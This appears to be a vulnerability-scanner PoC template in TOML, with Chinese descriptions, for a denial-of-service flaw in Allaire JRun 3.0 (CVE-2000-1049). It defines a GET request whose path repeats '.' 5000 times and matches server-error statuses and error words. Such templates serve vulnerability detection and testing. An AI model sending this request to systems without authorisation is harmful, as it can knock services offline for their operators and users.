[info]
author = "ave"
description = "向目标 Allaire JRun 3.0 HTTP Servlet 服务器发送包含大量连续 '.' 字符的恶意 URL 请求，验证是否存在拒绝服务漏洞"
id = "POC-AVE-2000-1061"
name = "Allaire JRun 3.0 HTTP Servlet 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1061"]
vuln_id = [
    "CVE-2000-1049",
    "AVE-2000-1061",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{repeat('.', 5000)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
    502,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Internal Server Error",
    "timeout",
    "denied",
]
